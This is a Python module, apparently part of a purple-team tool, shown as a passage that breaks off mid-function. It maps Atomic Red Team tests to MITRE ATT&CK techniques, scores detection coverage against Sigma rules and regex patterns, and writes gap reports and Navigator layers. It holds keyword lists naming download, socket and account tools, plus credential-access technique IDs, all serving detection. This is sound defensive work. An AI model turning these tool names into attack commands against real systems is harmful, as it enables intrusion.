"""
ThreatScope — Purple Team MITRE ATT&CK Verifier
Author: 0xSABRY

Validates detection coverage against the MITRE ATT&CK framework using
Atomic Red Team test definitions. Enables purple team workflows:
  - Load/parse Atomic Red Team YAML test catalogs
  - Execute simulation stubs and compare against expected detections
  - Build full coverage matrices (technique × data source × status)
  - Identify detection gaps with prioritized remediation guidance
  - Export coverage reports for compliance and maturity scoring

Integrates with core/sigma_engine.py for rule-based coverage and
core/analyzer.py for behavioral/pattern-based detection validation.
"""

import json
import logging
import hashlib
import re
from datetime import datetime, timezone
from collections import defaultdict
from pathlib import Path
from typing import (
    Dict, List, Optional, Set, Tuple, Any, Generator,
)

logger = logging.getLogger("threatscope.atomic_verifier")

try:
    import yaml
    YAML_AVAILABLE = True
except ImportError:
    YAML_AVAILABLE = False
    logger.debug("PyYAML not installed — Atomic YAML parsing disabled")


# ============================================================
# MITRE ATT&CK Enterprise Taxonomy (v14 subset)
# ============================================================

MITRE_TACTICS = {
    "TA0001": {"name": "Initial Access",       "order": 1},
    "TA0002": {"name": "Execution",             "order": 2},
    "TA0003": {"name": "Persistence",           "order": 3},
    "TA0004": {"name": "Privilege Escalation",  "order": 4},
    "TA0005": {"name": "Defense Evasion",       "order": 5},
    "TA0006": {"name": "Credential Access",     "order": 6},
    "TA0007": {"name": "Discovery",             "order": 7},
    "TA0008": {"name": "Lateral Movement",      "order": 8},
    "TA0009": {"name": "Collection",            "order": 9},
    "TA0010": {"name": "Exfiltration",          "order": 10},
    "TA0011": {"name": "Command and Control",   "order": 11},
    "TA0040": {"name": "Impact",                "order": 12},
    "TA0042": {"name": "Resource Development",  "order": 13},
    "TA0043": {"name": "Reconnaissance",        "order": 14},
}

# Technique → Tactic mappings (top 100 critical techniques)
TECHNIQUE_TACTIC_MAP = {
    # Initial Access
    "T1566":    ["TA0001"], "T1566.001": ["TA0001"], "T1566.002": ["TA0001"],
    "T1190":    ["TA0001"], "T1078":     ["TA0001", "TA0003", "TA0004", "TA0005"],
    "T1195":    ["TA0001"], "T1195.002": ["TA0001"],
    # Execution
    "T1059":    ["TA0002"], "T1059.001": ["TA0002"], "T1059.003": ["TA0002"],
    "T1059.004": ["TA0002"], "T1059.005": ["TA0002"], "T1059.006": ["TA0002"],
    "T1059.007": ["TA0002"],
    "T1204":    ["TA0002"], "T1204.002": ["TA0002"],
    "T1047":    ["TA0002"], "T1053":     ["TA0002", "TA0003"],
    "T1053.005": ["TA0002", "TA0003"],
    "T1569":    ["TA0002"], "T1569.002": ["TA0002"],
    # Persistence
    "T1547":    ["TA0003", "TA0004"], "T1547.001": ["TA0003", "TA0004"],
    "T1543":    ["TA0003", "TA0004"], "T1543.003": ["TA0003", "TA0004"],
    "T1136":    ["TA0003"], "T1136.001": ["TA0003"],
    "T1505":    ["TA0003"], "T1505.003": ["TA0003"],
    # Privilege Escalation
    "T1068":    ["TA0004"], "T1548":     ["TA0004", "TA0005"],
    "T1548.002": ["TA0004", "TA0005"],
    # Defense Evasion
    "T1070":    ["TA0005"], "T1070.001": ["TA0005"], "T1070.004": ["TA0005"],
    "T1027":    ["TA0005"], "T1027.001": ["TA0005"], "T1027.010": ["TA0005"],
    "T1036":    ["TA0005"], "T1036.005": ["TA0005"],
    "T1562":    ["TA0005"], "T1562.001": ["TA0005"],
    "T1218":    ["TA0005"], "T1218.011": ["TA0005"],
    "T1112":    ["TA0005"], "T1140":     ["TA0005"],
    # Credential Access
    "T1003":    ["TA0006"], "T1003.001": ["TA0006"], "T1003.003": ["TA0006"],
    "T1110":    ["TA0006"], "T1110.001": ["TA0006"], "T1110.003": ["TA0006"],
    "T1555":    ["TA0006"], "T1558":     ["TA0006"], "T1558.003": ["TA0006"],
    # Discovery
    "T1082":    ["TA0007"], "T1083":     ["TA0007"], "T1087":     ["TA0007"],
    "T1016":    ["TA0007"], "T1049":     ["TA0007"], "T1057":     ["TA0007"],
    "T1018":    ["TA0007"], "T1069":     ["TA0007"],
    # Lateral Movement
    "T1021":    ["TA0008"], "T1021.001": ["TA0008"], "T1021.002": ["TA0008"],
    "T1021.003": ["TA0008"], "T1021.006": ["TA0008"],
    "T1570":    ["TA0008"], "T1080":     ["TA0008"],
    # Collection
    "T1560":    ["TA0009"], "T1560.001": ["TA0009"],
    "T1005":    ["TA0009"], "T1114":     ["TA0009"],
    "T1074":    ["TA0009"], "T1113":     ["TA0009"],
    # Exfiltration
    "T1041":    ["TA0010"], "T1048":     ["TA0010"], "T1567":     ["TA0010"],
    # C2
    "T1071":    ["TA0011"], "T1071.001": ["TA0011"], "T1071.004": ["TA0011"],
    "T1105":    ["TA0011"], "T1573":     ["TA0011"], "T1572":     ["TA0011"],
    "T1090":    ["TA0011"], "T1095":     ["TA0011"],
    # Impact
    "T1486":    ["TA0040"], "T1489":     ["TA0040"], "T1490":     ["TA0040"],
    "T1485":    ["TA0040"], "T1491":     ["TA0040"],
}

# Data source categories for coverage granularity
DATA_SOURCES = [
    "process_creation", "command_line", "network_connection",
    "file_creation", "file_modification", "registry_modification",
    "dll_load", "service_creation", "authentication",
    "api_call", "scheduled_task", "dns_query",
    "wmi_event", "named_pipe", "driver_load",
]


# ============================================================
# Atomic Test Definition
# ============================================================

class AtomicTest:
    """
    Represents a single Atomic Red Team test case.

    Attributes:
        test_id: Unique test identifier (auto-generated hash).
        technique_id: MITRE ATT&CK technique ID (e.g., T1059.001).
        test_name: Human-readable test name.
        description: Test description.
        platforms: Supported platforms (windows, linux, macos).
        executor: Execution method (powershell, bash, cmd, manual).
        command: The command(s) to execute.
        cleanup_command: Optional cleanup after test.
        input_arguments: Required parameters.
        dependencies: Pre-conditions.
        expected_detections: What the detection stack should catch.
    """

    __slots__ = (
        "test_id", "technique_id", "test_name", "description",
        "platforms", "executor", "command", "cleanup_command",
        "input_arguments", "dependencies", "expected_detections",
        "data_sources", "severity", "tags",
    )

    def __init__(
        self,
        technique_id: str,
        test_name: str,
        description: str = "",
        platforms: Optional[List[str]] = None,
        executor: str = "manual",
        command: str = "",
        cleanup_command: str = "",
        input_arguments: Optional[Dict[str, Any]] = None,
        dependencies: Optional[List[Dict]] = None,
        expected_detections: Optional[List[str]] = None,
        data_sources: Optional[List[str]] = None,
        severity: str = "medium",
        tags: Optional[List[str]] = None,
    ) -> None:
        self.technique_id = technique_id.upper().strip()
        self.test_name = test_name
        self.description = description
        self.platforms = platforms or ["windows"]
        self.executor = executor
        self.command = command
        self.cleanup_command = cleanup_command
        self.input_arguments = input_arguments or {}
        self.dependencies = dependencies or []
        self.expected_detections = expected_detections or []
        self.data_sources = data_sources or []
        self.severity = severity
        self.tags = tags or []

        # Generate deterministic test ID
        seed = f"{self.technique_id}:{self.test_name}:{self.command[:100]}"
        self.test_id = hashlib.md5(seed.encode()).hexdigest()[:12]

    def to_dict(self) -> Dict[str, Any]:
        """Serialize to dictionary."""
        return {
            "test_id": self.test_id,
            "technique_id": self.technique_id,
            "test_name": self.test_name,
            "description": self.description,
            "platforms": self.platforms,
            "executor": self.executor,
            "command": self.command,
            "cleanup_command": self.cleanup_command,
            "input_arguments": self.input_arguments,
            "dependencies": self.dependencies,
            "expected_detections": self.expected_detections,
            "data_sources": self.data_sources,
            "severity": self.severity,
            "tags": self.tags,
        }

    def __repr__(self) -> str:
        return f"<AtomicTest {self.technique_id}/{self.test_id}: {self.test_name}>"


# ============================================================
# Test Result
# ============================================================

class TestResult:
    """
    Result of running or evaluating an atomic test against the
    detection stack.

    Attributes:
        test: The AtomicTest that was evaluated.
        status: One of 'detected', 'partial', 'missed', 'error', 'skipped'.
        detected_by: List of detection sources that triggered.
        expected_count: Number of expected detections.
        actual_count: Number of actual detections matched.
        confidence: Confidence score (0.0 – 1.0).
        details: Additional result details.
        timestamp: When the evaluation was performed.
    """

    def __init__(
        self,
        test: AtomicTest,
        status: str = "pending",
        detected_by: Optional[List[str]] = None,
        expected_count: int = 0,
        actual_count: int = 0,
        confidence: float = 0.0,
        details: str = "",
    ) -> None:
        self.test = test
        self.status = status
        self.detected_by = detected_by or []
        self.expected_count = expected_count
        self.actual_count = actual_count
        self.confidence = confidence
        self.details = details
        self.timestamp = datetime.now(timezone.utc).isoformat()

    @property
    def coverage_score(self) -> float:
        """Coverage ratio: actual / expected detections."""
        if self.expected_count == 0:
            return 1.0 if self.actual_count > 0 else 0.0
        return min(self.actual_count / self.expected_count, 1.0)

    def to_dict(self) -> Dict[str, Any]:
        """Serialize to dictionary."""
        return {
            "test_id": self.test.test_id,
            "technique_id": self.test.technique_id,
            "test_name": self.test.test_name,
            "status": self.status,
            "detected_by": self.detected_by,
            "expected_count": self.expected_count,
            "actual_count": self.actual_count,
            "confidence": round(self.confidence, 3),
            "coverage_score": round(self.coverage_score, 3),
            "details": self.details,
            "timestamp": self.timestamp,
        }


# ============================================================
# Atomic Test Runner (Simulation Mode)
# ============================================================

class AtomicTestRunner:
    """
    Loads Atomic Red Team test definitions and evaluates them
    against ThreatScope's detection stack in simulation mode.

    Does NOT execute real payloads — instead, it matches test
    signatures against loaded Sigma rules, YARA rules, and
    built-in pattern detections to assess coverage.

    Example:
        >>> runner = AtomicTestRunner()
        >>> runner.load_atomics_dir("atomic-red-team/atomics/")
        >>> results = runner.evaluate_against_sigma(sigma_engine)
        >>> print(runner.get_summary())
    """

    def __init__(self) -> None:
        """Initialize the test runner."""
        self.tests: List[AtomicTest] = []
        self.tests_by_technique: Dict[str, List[AtomicTest]] = defaultdict(list)
        self.results: List[TestResult] = []
        self._loaded_files: int = 0
        self._parse_errors: int = 0

    # ----------------------------------------------------------
    # Loading
    # ----------------------------------------------------------

    def load_atomics_dir(self, path: str) -> int:
        """
        Load all Atomic Red Team YAML files from a directory.

        Expected structure:
            atomics/
                T1059.001/
                    T1059.001.yaml
                T1003/
                    T1003.yaml
                ...

        Args:
            path: Path to the atomics directory.

        Returns:
            Number of tests loaded.
        """
        if not YAML_AVAILABLE:
            logger.error("PyYAML required for loading Atomic test definitions")
            return 0

        atomics_path = Path(path)
        if not atomics_path.is_dir():
            logger.error(f"Atomics directory not found: {path}")
            return 0

        count_before = len(self.tests)

        for technique_dir in sorted(atomics_path.iterdir()):
            if not technique_dir.is_dir():
                continue
            # Find YAML files
            for yaml_file in technique_dir.glob("*.yaml"):
                self._load_yaml_file(yaml_file)
            for yaml_file in technique_dir.glob("*.yml"):
                self._load_yaml_file(yaml_file)

        loaded = len(self.tests) - count_before
        logger.info(
            f"Loaded {loaded} atomic tests from {self._loaded_files} files "
            f"({self._parse_errors} parse errors)"
        )
        return loaded

    def _load_yaml_file(self, filepath: Path) -> None:
        """Parse a single Atomic Red Team YAML file."""
        try:
            with open(filepath, "r", encoding="utf-8", errors="replace") as fh:
                data = yaml.safe_load(fh)

            if not data or not isinstance(data, dict):
                return

            technique_id = data.get("attack_technique", "")
            display_name = data.get("display_name", "")
            atomic_tests = data.get("atomic_tests", [])

            if not technique_id or not atomic_tests:
                return

            for test_data in atomic_tests:
                if not isinstance(test_data, dict):
                    continue

                test_name = test_data.get("name", display_name)
                description = test_data.get("description", "")
                platforms = test_data.get("supported_platforms", ["windows"])
                executor_data = test_data.get("executor", {})

                executor = executor_data.get("name", "manual") if isinstance(executor_data, dict) else "manual"
                command = executor_data.get("command", "") if isinstance(executor_data, dict) else ""
                cleanup = executor_data.get("cleanup_command", "") if isinstance(executor_data, dict) else ""

                input_args = test_data.get("input_arguments", {})
                deps = test_data.get("dependencies", [])

                # Infer expected data sources from command content
                data_sources = self._infer_data_sources(command, executor)

                test = AtomicTest(
                    technique_id=technique_id,
                    test_name=test_name,
                    description=description,
                    platforms=platforms,
                    executor=executor,
                    command=command,
                    cleanup_command=cleanup,
                    input_arguments=input_args,
                    dependencies=deps,
                    data_sources=data_sources,
                )
                self.tests.append(test)
                self.tests_by_technique[technique_id.upper()].append(test)

            self._loaded_files += 1

        except Exception as e:
            self._parse_errors += 1
            logger.warning(f"Failed to parse atomic file {filepath}: {e}")

    def load_custom_tests(self, tests: List[Dict[str, Any]]) -> int:
        """
        Load custom test definitions from a list of dictionaries.

        Args:
            tests: List of test definition dicts with at minimum
                   'technique_id' and 'test_name'.

        Returns:
            Number of tests loaded.
        """
        count = 0
        for td in tests:
            try:
                test = AtomicTest(
                    technique_id=td.get("technique_id", "T0000"),
                    test_name=td.get("test_name", "Custom Test"),
                    description=td.get("description", ""),
                    platforms=td.get("platforms"),
                    executor=td.get("executor", "manual"),
                    command=td.get("command", ""),
                    cleanup_command=td.get("cleanup_command", ""),
                    expected_detections=td.get("expected_detections"),
                    data_sources=td.get("data_sources"),
                    severity=td.get("severity", "medium"),
                    tags=td.get("tags"),
                )
                self.tests.append(test)
                self.tests_by_technique[test.technique_id].append(test)
                count += 1
            except Exception as e:
                logger.warning(f"Failed to load custom test: {e}")
        return count

    def _infer_data_sources(self, command: str, executor: str) -> List[str]:
        """Infer data sources from command content for coverage mapping."""
        sources = set()
        cmd_lower = command.lower()

        # Process creation
        if any(kw in cmd_lower for kw in [
            "powershell", "cmd", "bash", "python", "wscript",
            "cscript", "mshta", "rundll32", "regsvr32",
        ]):
            sources.add("process_creation")
            sources.add("command_line")

        # Network
        if any(kw in cmd_lower for kw in [
            "invoke-webrequest", "wget", "curl", "net.webclient",
            "socket", "nslookup", "dns", "http",
        ]):
            sources.add("network_connection")
            sources.add("dns_query")

        # File operations
        if any(kw in cmd_lower for kw in [
            "copy", "move", "new-item", "out-file", "set-content",
            "cp ", "mv ", "touch", "echo >",
        ]):
            sources.add("file_creation")
            sources.add("file_modification")

        # Registry
        if any(kw in cmd_lower for kw in [
            "reg add", "reg delete", "set-itemproperty",
            "new-itemproperty", "hklm", "hkcu",
        ]):
            sources.add("registry_modification")

        # Service / scheduled task
        if any(kw in cmd_lower for kw in [
            "sc create", "new-service", "schtasks", "at ",
            "register-scheduledtask",
        ]):
            sources.add("service_creation")
            sources.add("scheduled_task")

        # DLL
        if any(kw in cmd_lower for kw in [
            "loadlibrary", "rundll32", "regsvr32", ".dll",
        ]):
            sources.add("dll_load")

        # WMI
        if any(kw in cmd_lower for kw in [
            "wmic", "get-wmiobject", "invoke-wmimethod", "wmiprvse",
        ]):
            sources.add("wmi_event")

        # Authentication
        if any(kw in cmd_lower for kw in [
            "net user", "runas", "logon", "passwd", "useradd",
            "adduser", "sudo",
        ]):
            sources.add("authentication")

        # Fallback
        if not sources:
            sources.add("process_creation")
            sources.add("command_line")

        return sorted(sources)

    # ----------------------------------------------------------
    # Evaluation against detection stack
    # ----------------------------------------------------------

    def evaluate_against_sigma(self, sigma_engine) -> List[TestResult]:
        """
        Evaluate loaded atomic tests against the Sigma rule engine
        to determine detection coverage.

        For each test, checks whether any loaded Sigma rules would
        detect the technique based on technique ID matching and
        command-line pattern matching.

        Args:
            sigma_engine: An initialized SigmaEngine instance with
                          loaded rules.

        Returns:
            List of TestResult objects.
        """
        results = []

        if not hasattr(sigma_engine, "rules"):
            logger.warning("SigmaEngine has no loaded rules")
            return results

        # Build Sigma coverage index: technique → list of rule titles
        sigma_coverage: Dict[str, List[str]] = defaultdict(list)
        for rule in sigma_engine.rules:
            for technique in rule.mitre_techniques:
                sigma_coverage[technique.upper()].append(rule.title)

        for test in self.tests:
            tid = test.technique_id
            matching_rules = sigma_coverage.get(tid, [])

            # Also check sub-technique → parent
            parent_tid = tid.split(".")[0] if "." in tid else ""
            if parent_tid and parent_tid != tid:
                matching_rules.extend(sigma_coverage.get(parent_tid, []))

            if matching_rules:
                status = "detected"
                confidence = min(len(matching_rules) / 3.0, 1.0)
            else:
                status = "missed"
                confidence = 0.0

            result = TestResult(
                test=test,
                status=status,
                detected_by=matching_rules[:10],
                expected_count=max(1, len(test.expected_detections)),
                actual_count=len(matching_rules),
                confidence=confidence,
                details=(
                    f"Matched {len(matching_rules)} Sigma rule(s)"
                    if matching_rules
                    else "No Sigma rules cover this technique"
                ),
            )
            results.append(result)

        self.results.extend(results)
        logger.info(
            f"Evaluated {len(results)} tests against Sigma: "
            f"{sum(1 for r in results if r.status == 'detected')} detected, "
            f"{sum(1 for r in results if r.status == 'missed')} missed"
        )
        return results

    def evaluate_against_analyzer(self, analyzer_cls) -> List[TestResult]:
        """
        Evaluate test coverage against ThreatScope's built-in
        pattern detection engine.

        Checks each test command against the analyzer's regex patterns
        to determine if they would be detected by behavioral rules.

        Args:
            analyzer_cls: The ThreatAnalyzer class (not instance) to
                          inspect for BUILTIN_PATTERNS.

        Returns:
            List of TestResult objects.
        """
        results = []

        # Import built-in patterns from analyzer module
        try:
            from core.analyzer import BUILTIN_PATTERNS
        except ImportError:
            logger.warning("Cannot import BUILTIN_PATTERNS from analyzer")
            return results

        for test in self.tests:
            cmd = test.command
            if not cmd:
                results.append(TestResult(
                    test=test, status="skipped",
                    details="No command defined for pattern matching",
                ))
                continue

            detected_categories = []

            for category, rule_def in BUILTIN_PATTERNS.items():
                patterns = rule_def.get("patterns", [])
                for pattern in patterns:
                    try:
                        if re.search(pattern, cmd, re.IGNORECASE):
                            detected_categories.append(category)
                            break
                    except re.error:
                        continue

            if detected_categories:
                status = "detected"
                confidence = min(len(detected_categories) / 2.0, 1.0)
            else:
                status = "missed"
                confidence = 0.0

            result = TestResult(
                test=test,
                status=status,
                detected_by=detected_categories[:10],
                expected_count=1,
                actual_count=len(detected_categories),
                confidence=confidence,
                details=(
                    f"Matched {len(detected_categories)} built-in pattern(s): "
                    f"{', '.join(detected_categories[:5])}"
                    if detected_categories
                    else "No built-in patterns match test command"
                ),
            )
            results.append(result)

        self.results.extend(results)
        return results

    def evaluate_combined(self, sigma_engine=None, analyzer_cls=None) -> List[TestResult]:
        """
        Run combined evaluation against all available detection sources.

        Merges Sigma and analyzer results, taking the best detection
        status for each test.

        Args:
            sigma_engine: Optional SigmaEngine with loaded rules.
            analyzer_cls: Optional ThreatAnalyzer class.

        Returns:
            Merged list of TestResult objects.
        """
        sigma_results: Dict[str, TestResult] = {}
        analyzer_results: Dict[str, TestResult] = {}

        if sigma_engine:
            for r in self.evaluate_against_sigma(sigma_engine):
                sigma_results[r.test.test_id] = r

        if analyzer_cls:
            for r in self.evaluate_against_analyzer(analyzer_cls):
                analyzer_results[r.test.test_id] = r

        # Merge: for each test, prefer 'detected' > 'partial' > 'missed'
        merged = []
        status_priority = {"detected": 3, "partial": 2, "missed": 1, "skipped": 0, "error": 0}

        seen_ids: Set[str] = set()
        for test in self.tests:
            if test.test_id in seen_ids:
                continue
            seen_ids.add(test.test_id)

            sr = sigma_results.get(test.test_id)
            ar = analyzer_results.get(test.test_id)

            best = None
            for candidate in [sr, ar]:
                if candidate is None:
                    continue
                if best is None or status_priority.get(candidate.status, 0) > status_priority.get(best.status, 0):
                    best = candidate

            if best:
                # Merge detected_by from both sources
                all_detected_by = []
                if sr and sr.detected_by:
                    all_detected_by.extend([f"[Sigma] {d}" for d in sr.detected_by[:5]])
                if ar and ar.detected_by:
                    all_detected_by.extend([f"[Pattern] {d}" for d in ar.detected_by[:5]])
                best.detected_by = all_detected_by
                best.details = " | ".join(filter(None, [
                    sr.details if sr else None,
                    ar.details if ar else None,
                ]))
                merged.append(best)

        return merged

    # ----------------------------------------------------------
    # Summary & Reporting
    # ----------------------------------------------------------

    def get_summary(self) -> Dict[str, Any]:
        """
        Get a summary of all test evaluations.

        Returns:
            Dictionary with total counts, coverage percentages,
            and per-technique breakdowns.
        """
        total = len(self.results)
        detected = sum(1 for r in self.results if r.status == "detected")
        partial = sum(1 for r in self.results if r.status == "partial")
        missed = sum(1 for r in self.results if r.status == "missed")
        skipped = sum(1 for r in self.results if r.status == "skipped")

        coverage_pct = (detected + partial * 0.5) / max(total, 1) * 100

        # Per-technique summary
        technique_status: Dict[str, Dict[str, int]] = defaultdict(
            lambda: {"detected": 0, "partial": 0, "missed": 0, "skipped": 0}
        )
        for r in self.results:
            tid = r.test.technique_id
            technique_status[tid][r.status] = technique_status[tid].get(r.status, 0) + 1

        # Identify top gaps (techniques with most misses)
        gaps = []
        for tid, stats in technique_status.items():
            if stats.get("missed", 0) > 0:
                tactics = TECHNIQUE_TACTIC_MAP.get(tid, [])
                tactic_names = [MITRE_TACTICS.get(t, {}).get("name", t) for t in tactics]
                gaps.append({
                    "technique_id": tid,
                    "tactics": tactic_names,
                    "missed_tests": stats["missed"],
                    "total_tests": sum(stats.values()),
                    "priority": self._gap_priority(tid, stats["missed"]),
                })

        gaps.sort(key=lambda g: g["priority"], reverse=True)

        return {
            "total_tests": total,
            "detected": detected,
            "partial": partial,
            "missed": missed,
            "skipped": skipped,
            "coverage_percentage": round(coverage_pct, 1),
            "unique_techniques_tested": len(technique_status),
            "technique_status": dict(technique_status),
            "top_gaps": gaps[:20],
            "evaluation_timestamp": datetime.now(timezone.utc).isoformat(),
        }

    def _gap_priority(self, technique_id: str, missed_count: int) -> int:
        """Calculate gap priority score for remediation ordering."""
        # Higher priority for commonly abused techniques
        high_priority_techniques = {
            "T1059", "T1059.001", "T1003", "T1003.001", "T1021",
            "T1078", "T1053", "T1547", "T1068", "T1486",
            "T1070", "T1071", "T1566", "T1190", "T1110",
        }
        base = missed_count * 10
        if technique_id in high_priority_techniques:
            base += 50
        parent = technique_id.split(".")[0]
        if parent in high_priority_techniques:
            base += 30
        return base

    def get_gap_report(self) -> str:
        """
        Generate a human-readable detection gap report.

        Returns:
            Multi-line string report of detection gaps with
            remediation recommendations.
        """
        summary = self.get_summary()
        lines = [
            "=" * 72,
            "  ThreatScope — Detection Coverage Gap Report",
            "=" * 72,
            f"  Total Tests:        {summary['total_tests']}",
            f"  Detected:           {summary['detected']} "
            f"({summary['coverage_percentage']:.1f}% coverage)",
            f"  Partial:            {summary['partial']}",
            f"  Missed:             {summary['missed']}",
            f"  Skipped:            {summary['skipped']}",
            f"  Techniques Tested:  {summary['unique_techniques_tested']}",
            "-" * 72,
        ]

        if summary["top_gaps"]:
            lines.append("\n  TOP DETECTION GAPS (prioritized):")
            lines.append("-" * 72)
            for i, gap in enumerate(summary["top_gaps"][:15], 1):
                tactics_str = ", ".join(gap["tactics"]) if gap["tactics"] else "Unknown"
                lines.append(
                    f"  {i:2d}. {gap['technique_id']:12s} | "
                    f"Missed: {gap['missed_tests']}/{gap['total_tests']} | "
                    f"Tactic: {tactics_str}"
                )

        lines.append("\n" + "=" * 72)

        # Remediation recommendations
        lines.append("\n  REMEDIATION RECOMMENDATIONS:")
        lines.append("-" * 72)

        missed_techniques = set()
        for r in self.results:
            if r.status == "missed":
                missed_techniques.add(r.test.technique_id)

        recommendations = self._generate_recommendations(missed_techniques)
        for rec in recommendations[:10]:
            lines.append(f"  ▸ {rec}")

        return "\n".join(lines)

    def _generate_recommendations(self, missed_techniques: Set[str]) -> List[str]:
        """Generate actionable remediation recommendations."""
        recs = []

        # Check for critical gaps
        cred_access = {"T1003", "T1003.001", "T1003.003", "T1110", "T1558"}
        if missed_techniques & cred_access:
            recs.append(
                "CRITICAL: Credential access detection gaps. "
                "Deploy Sysmon EventID 10 (ProcessAccess) for LSASS monitoring, "
                "enable Windows Security Event 4625/4624 auditing."
            )

        execution = {"T1059", "T1059.001", "T1059.003", "T1059.004"}
        if missed_techniques & execution:
            recs.append(
                "HIGH: Script execution gaps. Enable PowerShell ScriptBlock "
                "logging (EventID 4104), Module logging, and Transcription. "
                "Deploy Sysmon for command-line capture."
            )

        persistence = {"T1547", "T1547.001", "T1543", "T1053"}
        if missed_techniques & persistence:
            recs.append(
                "HIGH: Persistence mechanism gaps. Monitor registry Run keys "
                "(Sysmon 12/13/14), service creation (System 7045), "
                "and scheduled task events (Security 4698)."
            )

        evasion = {"T1070", "T1027", "T1036", "T1562"}
        if missed_techniques & evasion:
            recs.append(
                "MEDIUM: Defense evasion gaps. Enable audit policy for "
                "log clearing (1102), implement AMSI integration, "
                "and deploy file integrity monitoring."
            )

        lateral = {"T1021", "T1021.001", "T1021.002", "T1570"}
        if missed_techniques & lateral:
            recs.append(
                "HIGH: Lateral movement gaps. Enable Windows Security "
                "Events 4624 Type 3/10, 5140 (Share Access), "
                "and deploy network segment monitoring."
            )

        c2 = {"T1071", "T1105", "T1572", "T1573"}
        if missed_techniques & c2:
            recs.append(
                "HIGH: C2 detection gaps. Implement DNS logging, "
                "deploy SSL/TLS inspection, and enable proxy logging "
                "with JA3/JA3S fingerprinting."
            )

        if not recs:
            recs.append("No critical detection gaps identified — coverage is strong.")

        recs.append(
            f"SUMMARY: {len(missed_techniques)} unique techniques lack detection. "
            f"Consider writing targeted Sigma rules using ThreatScope's "
            f"core/rule_gen.py SigmaRuleGenerator."
        )

        return recs

    def clear_results(self) -> None:
        """Clear all evaluation results (keeps loaded tests)."""
        self.results.clear()


# ============================================================
# Coverage Matrix
# ============================================================

class CoverageMatrix:
    """
    Builds a MITRE ATT&CK coverage heatmap matrix showing detection
    status per technique per tactic.

    Supports:
      - Merge from multiple evaluation sources (Sigma, YARA, patterns)
      - Export to JSON, CSV, and Navigator layer format
      - Gap analysis with prioritization
      - Maturity scoring per tactic

    Example:
        >>> matrix = CoverageMatrix()
        >>> matrix.ingest_results(test_results)
        >>> matrix.ingest_sigma_coverage(sigma_engine)
        >>> layer = matrix.export_navigator_layer()
    """

    # Detection status color mapping for ATT&CK Navigator
    STATUS_COLORS = {
        "full":     "#10b981",   # Green — fully detected
        "partial":  "#f59e0b",   # Amber — partially detected
        "none":     "#ef4444",   # Red   — not detected
        "untested": "#374151",   # Gray  — not tested
    }

    def __init__(self) -> None:
        """Initialize an empty coverage matrix."""
        # technique_id → { "status", "sources", "confidence", "test_count" }
        self.coverage: Dict[str, Dict[str, Any]] = {}
        # tactic_id → set of technique_ids
        self.tactic_techniques: Dict[str, Set[str]] = defaultdict(set)

    def ingest_results(self, results: List[TestResult]) -> None:
        """
        Ingest test results into the coverage matrix.

        Args:
            results: List of TestResult from AtomicTestRunner.
        """
        for r in results:
            tid = r.test.technique_id
            existing = self.coverage.get(tid, {
                "status": "untested",
                "sources": [],
                "confidence": 0.0,
                "test_count": 0,
                "detected_count": 0,
            })

            existing["test_count"] += 1
            if r.status == "detected":
                existing["detected_count"] += 1
            existing["sources"] = list(set(existing.get("sources", []) + r.detected_by))
            existing["confidence"] = max(existing.get("confidence", 0), r.confidence)

            # Update status
            ratio = existing["detected_count"] / max(existing["test_count"], 1)
            if ratio >= 0.8:
                existing["status"] = "full"
            elif ratio > 0:
                existing["status"] = "partial"
            else:
                existing["status"] = "none"

            self.coverage[tid] = existing

            # Map to tactics
            tactics = TECHNIQUE_TACTIC_MAP.get(tid, [])
            for tactic in tactics:
                self.tactic_techniques[tactic].add(tid)

    def ingest_sigma_coverage(self, sigma_engine) -> None:
        """
        Ingest Sigma rule coverage into the matrix without running tests.

        Marks techniques as 'full' if 3+ Sigma rules exist,
        'partial' if 1-2 rules exist.

        Args:
            sigma_engine: Initialized SigmaEngine with loaded rules.
        """
        if not hasattr(sigma_engine, "rules"):
            return

        technique_rules: Dict[str, int] = defaultdict(int)
        for rule in sigma_engine.rules:
            for tech in rule.mitre_techniques:
                technique_rules[tech.upper()] += 1

        for tid, count in technique_rules.items():
            existing = self.coverage.get(tid, {
                "status": "untested",
                "sources": [],
                "confidence": 0.0,
                "test_count": 0,
                "detected_count": 0,
            })

            existing["sources"] = list(set(
                existing.get("sources", []) + [f"Sigma ({count} rules)"]
            ))

            if count >= 3:
                if existing.get("status") != "full":
                    existing["status"] = "full"
                    existing["confidence"] = max(existing.get("confidence", 0), 0.9)
            elif count >= 1:
                if existing.get("status") in ("untested", "none"):
                    existing["status"] = "partial"
                    existing["confidence"] = max(existing.get("confidence", 0), 0.5)

            self.coverage[tid] = existing

            tactics = TECHNIQUE_TACTIC_MAP.get(tid, [])
            for tactic in tactics:
                self.tactic_techniques[tactic].add(tid)

    def get_tactic_scores(self) -> Dict[str, Dict[str, Any]]:
        """
        Calculate maturity scores per tactic.

        Returns:
            Dictionary of tactic_id → {name, score, total, covered, partial}.
        """
        scores = {}
        for tactic_id, info in MITRE_TACTICS.items():
            techniques = self.tactic_techniques.get(tactic_id, set())
            total = len(techniques)
            full = sum(
                1 for t in techniques
                if self.coverage.get(t, {}).get("status") == "full"
            )
            partial = sum(
                1 for t in techniques
                if self.coverage.get(t, {}).get("status") == "partial"
            )
            score = (full + partial * 0.5) / max(total, 1) * 100

            scores[tactic_id] = {
                "name": info["name"],
                "order": info["order"],
                "total_techniques": total,
                "full_coverage": full,
                "partial_coverage": partial,
                "no_coverage": total - full - partial,
                "maturity_score": round(score, 1),
            }

        return scores

    def export_navigator_layer(
        self,
        name: str = "ThreatScope Coverage",
        description: str = "Auto-generated by ThreatScope",
    ) -> Dict[str, Any]:
        """
        Export coverage as a MITRE ATT&CK Navigator layer JSON.

        Args:
            name: Layer name.
            description: Layer description.

        Returns:
            Dictionary compatible with ATT&CK Navigator import.
        """
        techniques = []
        for tid, info in self.coverage.items():
            color = self.STATUS_COLORS.get(info.get("status", "untested"), "#374151")
            score = {
                "full": 100, "partial": 50, "none": 0, "untested": 0,
            }.get(info.get("status", "untested"), 0)

            entry = {
                "techniqueID": tid,
                "color": color,
                "score": score,
                "comment": f"Sources: {', '.join(info.get('sources', [])[:5])}",
                "enabled": True,
                "metadata": [],
            }

            # Add tactic linkage
            tactics = TECHNIQUE_TACTIC_MAP.get(tid, [])
            if tactics:
                entry["tactic"] = tactics[0].lower()

            techniques.append(entry)

        return {
            "name": name,
            "versions": {
                "attack": "14",
                "navigator": "4.9",
                "layer": "4.5",
            },
            "domain": "enterprise-attack",
            "description": description,
            "filters": {"platforms": ["Windows", "Linux", "macOS"]},
            "sorting": 3,
            "layout": {
                "layout": "side",
                "showID": True,
                "showName": True,
                "showAggregateScores": True,
                "countUnscored": False,
                "aggregateFunction": "average",
